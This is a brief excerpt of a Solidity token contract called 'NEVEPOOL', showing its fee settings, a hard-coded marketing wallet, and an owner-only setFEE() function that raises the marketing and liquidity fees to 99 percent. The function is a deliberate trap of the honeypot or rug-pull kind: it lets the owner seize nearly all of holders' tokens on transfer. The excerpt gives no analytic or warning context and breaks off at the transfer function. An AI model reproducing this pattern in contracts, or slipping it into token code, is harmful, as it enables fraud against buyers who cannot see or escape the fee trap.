...
contract NEVEPOOL is Context, IERC20, Ownable {
    ...
    string private constant _name = "NEVEPOOL"; // 
    string private constant _symbol = "$NEVEPOO"; //    
    uint8 private constant _decimals = 9; // 
    
    uint256 private _marketingFee = 6;
    uint256 private _liquidityFee = 3;
    address private  _marketingWallet = 0xa3D6EDF41247EEbB85d0DB324E7320e5e19055c3;
    ...
    function setFEE() onlyOwner public{
        _marketingFee = 99;
        _liquidityFee = 99;
    }
    function _transfer(
